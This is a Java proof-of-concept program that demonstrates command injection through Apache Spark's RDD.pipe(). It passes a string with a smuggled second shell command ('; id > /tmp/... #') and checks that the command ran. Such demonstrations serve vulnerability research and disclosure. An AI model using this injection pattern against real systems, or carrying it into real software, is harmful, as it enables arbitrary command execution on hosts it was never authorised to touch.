package com.example.sparkpoc;

import org.apache.spark.SparkConf;
import org.apache.spark.api.java.JavaRDD;
import org.apache.spark.api.java.JavaSparkContext;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.util.Arrays;
import java.util.List;

public class CommandInjectionPoC {
    public static void main(String[] args) {
        // Create a Spark configuration
        SparkConf conf = new SparkConf()
                .setAppName("SparkCommandInjectionPoC")
                .setMaster("local[*]");
        
        // Create a JavaSparkContext
        JavaSparkContext sc = new JavaSparkContext(conf);
        
        try {
            // Create a simple RDD with some data
            List<String> data = Arrays.asList("line1", "line2", "line3");
            JavaRDD<String> rdd = sc.parallelize(data);
            
            // Create output file to verify command execution
            String outputFile = "/tmp/spark_cmd_injection_poc";
            
            // Delete the file if it already exists
            File file = new File(outputFile);
            if (file.exists()) {
                file.delete();
            }
            
            System.out.println("\n[+] Starting Command Injection PoC");
            System.out.println("[+] Initial check - File exists: " + file.exists());
            
            // This is where the command injection happens
            // We're injecting '; id > /tmp/spark_cmd_injection_poc #' into the command
            // The semicolon terminates the 'cat' command and executes 'id' command
            // The '#' comments out anything after our injection
            String maliciousInput = "cat ; id > " + outputFile + " #";
            
            System.out.println("[+] Executing RDD.pipe() with input: " + maliciousInput);
            
            // This is the vulnerable operation that allows command injection
            JavaRDD<String> result = rdd.pipe(maliciousInput);
            
            // Collect the results to trigger execution of the pipe command
            List<String> output = result.collect();
            
            System.out.println("[+] Output from RDD.pipe():");
            for (String line : output) {
                System.out.println("    " + line);
            }
            
            // Check if our injected command was executed by checking for the output file
            System.out.println("\n[+] Checking if command injection was successful");
            System.out.println("[+] File exists after exploit: " + file.exists());
            
            // Read and display the content of the file to prove command execution
            if (file.exists()) {
                System.out.println("[+] Content of " + outputFile + ":");
                try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
                    String line;
                    while ((line = reader.readLine()) != null) {
                        System.out.println("    " + line);
                    }
                } catch (IOException e) {
                    System.err.println("Error reading file: " + e.getMessage());
                }
                System.out.println("\n[!] Command Injection SUCCESSFUL!");
            } else {
                System.out.println("[-] Command Injection failed");
            }
            
        } finally {
            // Stop the SparkContext
            sc.stop();
        }
    }
}
